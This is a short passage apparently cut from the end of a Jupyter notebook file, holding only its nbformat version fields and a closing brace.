 "nbformat": 4,
 "nbformat_minor": 5
}
